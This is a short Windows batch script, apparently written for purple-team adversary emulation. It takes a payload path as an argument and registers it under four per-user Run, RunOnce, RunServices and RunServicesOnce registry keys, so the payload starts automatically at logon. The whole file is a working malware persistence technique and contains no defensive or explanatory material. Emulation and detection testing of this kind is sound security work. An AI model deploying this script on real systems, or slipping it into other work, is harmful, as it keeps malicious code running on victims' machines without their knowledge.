set payloadPath=%1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PurpleTeamRun /t REG_SZ /d "%payloadPath%"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v PurpleTeamRunOnce /t REG_SZ /d "%payloadPath%"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v PurpleTeamRunServices /t REG_SZ /d "%payloadPath%"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v PurpleTeamRunServicesOnce /t REG_SZ /d "%payloadPath%"